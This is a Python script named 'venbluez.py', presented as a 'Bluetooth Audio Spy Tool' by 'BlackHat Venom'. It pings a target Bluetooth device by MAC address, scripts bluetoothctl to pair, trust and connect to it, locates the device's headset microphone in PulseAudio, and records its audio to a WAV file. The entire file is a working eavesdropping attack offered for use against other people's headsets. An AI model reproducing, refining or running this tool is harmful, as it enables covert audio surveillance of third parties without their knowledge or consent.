import argparse
import subprocess
import os
import time
import signal
import sys
import shutil

recorder = None

def stop_recording(sig, frame):
    print("\n[!] Stopping recording...")
    if recorder:
        recorder.terminate()
    sys.exit(0)

signal.signal(signal.SIGINT, stop_recording)

def check_requirements():
    for tool in ["l2ping", "parecord", "bluetoothctl", "pactl"]:
        if not shutil.which(tool):
            print(f"[!] Required tool '{tool}' not found. Please install it.")
            sys.exit(1)

def check_vulnerability(mac):
    print(f"[+] Checking if {mac} is reachable (via l2ping)...")
    try:
        output = subprocess.check_output(["sudo", "l2ping", "-c", "1", mac], stderr=subprocess.STDOUT)
        if b"1 sent" in output:
            print(f"[+] Device {mac} is responding. Likely reachable.")
            return True
    except subprocess.CalledProcessError as e:
        print("[-] Device not responding to l2ping.")
        print(f"    Error: {e.output.decode().strip()}")
    except Exception as e:
        print(f"[!] Unexpected error in l2ping: {e}")
    return False

def pair_and_connect(mac):
    print(f"[+] Pairing and connecting to {mac} via bluetoothctl...")

    commands = f"""
power on
agent on
default-agent
scan on
pair {mac}
trust {mac}
connect {mac}
exit
"""
    with open("bt_script.txt", "w") as f:
        f.write(commands)

    try:
        subprocess.run(["bluetoothctl"], stdin=open("bt_script.txt", "r"),
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[+] Pairing & connection attempted for {mac}")
    except Exception as e:
        print(f"[!] Error during bluetoothctl operation: {e}")
    finally:
        os.remove("bt_script.txt")

def find_active_bluetooth_source(mac):
    print("[*] Searching for active Bluetooth mic source (auto-match)...")
    mac_id = mac.replace(":", "_").lower()
    try:
        output = subprocess.check_output(["pactl", "list", "sources", "short"]).decode()
        for line in output.strip().split("\n"):
            if f"bluez_source.{mac_id}" in line and "headset_head_unit" in line:
                source_name = line.split()[1]
                print(f"[+] Found active Bluetooth source: {source_name}")
                return source_name
        print("[!] Bluetooth mic source not found in PulseAudio source list.")
        print("[i] Make sure the device is connected and in HSP/HFP profile.")
        print("[i] You can manually test using:")
        print(f"    parecord --device=bluez_source.{mac_id}.headset_head_unit test.wav")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error while searching for source: {e}")
        sys.exit(1)

def start_recording(mac, source_name):
    global recorder
    print("[+] Starting audio recording... Press Ctrl+C to stop.")
    os.makedirs("recordings", exist_ok=True)
    filename = f"recordings/{mac.replace(':', '_')}.wav"
    try:
        recorder = subprocess.Popen(["parecord", "--device", source_name, filename])
        recorder.wait()
    except Exception as e:
        print(f"[!] Failed to start recording: {e}")
        sys.exit(1)

def main():
    print("""
                     _      _                   
 __   __ ___  _ __  | |__  | | _   _   ___  ____ 
 \ \ / // _ \| '_ \ | '_ \ | || | | | / _ \|_  /
  \ V /|  __/| | | || |_) || || |_| ||  __/ / / 
   \_/  \___||_| |_||_.__/ |_| \__,_| \___|/___|

                   by BlackHat Venom
""")

    parser = argparse.ArgumentParser(description="venbluez.py - Bluetooth Audio Spy Tool")
    parser.add_argument("-a", "--address", required=True, help="Target Bluetooth MAC Address")
    args = parser.parse_args()

    check_requirements()
    target = args.address

    if not check_vulnerability(target):
        print("[-] Target device is not reachable.")
        return

    pair_and_connect(target)
    time.sleep(3)  # wait for audio interface to register

    source = find_active_bluetooth_source(target)
    start_recording(target, source)

if __name__ == "__main__":
    main()
